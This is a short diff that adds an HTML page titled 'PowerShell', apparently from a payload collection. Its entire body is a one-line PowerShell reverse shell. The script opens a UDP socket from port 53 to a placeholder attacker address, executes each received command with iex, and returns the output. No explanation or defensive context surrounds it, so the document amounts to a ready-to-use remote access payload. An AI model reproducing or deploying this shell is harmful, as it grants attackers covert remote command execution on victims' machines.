@@ -1,0 +1,6 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>PowerShell</title>
+</head><body>$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse("&lt;attacker ip address"),&lt;listening port&gt;);$client = New-Object System.Net.Sockets.UDPClient(53);[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes('PS&gt; ');$client.Send($sendbytes,$sendbytes.Length,$endpoint);while($true){;$receivebytes = $client.Receive([ref]$endpoint);$returndata = ([text.encoding]::ASCII).GetString($receivebytes);$sendback = (iex $returndata 2&gt;&amp;1 | Out-String );$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback);$client.Send($sendbytes,$sendbytes.Length,$endpoint)};$client.Close()</body></html>
